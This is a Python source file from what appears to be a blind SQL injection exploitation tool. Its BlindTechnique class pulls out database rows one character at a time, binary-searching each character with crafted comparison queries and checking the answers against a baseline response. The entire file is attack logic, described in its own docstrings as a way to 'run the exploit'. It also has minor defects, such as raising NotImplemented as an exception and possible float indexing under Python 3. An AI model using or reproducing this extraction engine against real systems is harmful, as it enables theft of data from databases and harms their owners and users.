#file: technique.py

from . import debug
from .settings import *
from .exceptions import *

from gevent.pool import Pool
from copy import copy

class Technique(object):
    '''
    This is a sql injection teqnique. Eg. Union based or Time based... Techniques need
    to implement at minimum the run method which is what actually launches the technique.
    Techniques will usually also take a user_query (query we are trying to run on the db).
    The class init init will (almost?) always take a make_request_func as a param. This
    option specifies the function to call to make an actual request. 
    '''
    @debug.func
    def __init__(self,make_request_func,query,concurrency=1): 
        self.query = query
        self.make_request_func = make_request_func
        self.pool = Pool(size=concurrency)

        if type(self) == Technique:
            raise NotImplemented

    def run(self):
        '''
        run the exploit
        '''
        raise NotImplemented("technique.run")


class BlindTechnique(Technique):
    @debug.func
    def run(self,user_query,sleep=1):
        self.sleep = sleep

        user_query = user_query

        try:
            self.base_response
        except AttributeError:
            self._make_base_request()
    
        results = []
        row_index = 0
        row = True
        #we get more rows until the table is over
        while row:            
            #if this isnt the first iteration
            if row != True:
                results.append(row)
            row = self._get_next_row(row_index,user_query)
            row_index += 1
        return results

    @debug.func
    def _get_next_row(self,row_index,user_query):
        '''finding a row'''
        row = ""
        char_index = 1
        char = True
        #we get more chars until the row is over
        while char:
            #if this isnt the first iteration
            if char != True:
                row += char
            char = self._get_next_char(char_index,row_index,user_query)
            char_index += 1
        if row != "":
            return row
        else:
            return False

    @debug.func
    def _get_next_char(self,char_index,row_index,user_query):
        '''finding a character'''
        low = 0
        high = CHARSET_LEN
        while low < high:
            mid = (low+high)/2
            if self._is_greater(row_index, char_index, CHARSET[mid],user_query):
                high = mid
            elif self._is_less(row_index, char_index, CHARSET[mid],user_query):
                low = mid + 1
            elif low < CHARSET_LEN and self._is_equal(row_index, char_index, CHARSET[mid],user_query):
                return CHARSET[mid]
            else:
                return False
    
    @debug.func
    def _is_greater(self,row_index,char_index,char_val,user_query):
        '''
        Returns true if the specified character in the specified row is greater
        that char_value. It is up to you how to implement this...
        '''
        query = copy(self.query)
        query.set_option('user_query',user_query)
        query.set_option('row_index',str(row_index))
        query.set_option('char_index',str(char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','<')
        query_string = query.render()
        #if the response differs from the base_response, we return true
        rval = self.make_request_func(query_string) == self.base_response
        return rval

    @debug.func
    def _is_less(self,row_index,char_index,char_val,user_query):
        '''
        Returns true if the specified character in the specified row is les
        than char_value. It is up to you how to implement this...
        '''
        query = copy(self.query)
        query.set_option('user_query',user_query)
        query.set_option('row_index',str(row_index))
        query.set_option('char_index',str(char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','>')
        query_string = query.render()
        #if the response differs from the base_response, we return true
        rval = self.make_request_func(query_string) == self.base_response
        return rval

    @debug.func
    def _is_equal(self,row_index,char_index,char_val,user_query):
        '''
        Returns true if the specified character in the specified row is equal
        that char_value. It is up to you how to implement this...
        '''  
        query = copy(self.query)
        query.set_option('user_query',user_query)
        query.set_option('row_index',str(row_index))
        query.set_option('char_index',str(char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','=')
        query_string = query.render()

        #if the response differs from the base_response, we return true
        rval = self.make_request_func(query_string) == self.base_response
        return rval
    
    @debug.func
    def _make_base_request(self):
        '''
        Makes the base request to which all subsequent requests will be compared.
        The need for a base request is just a fact when dealing with blind sqli
        '''
        query = copy(self.query)
        query_string = query.render()
        self.base_response = self.make_request_func(query_string)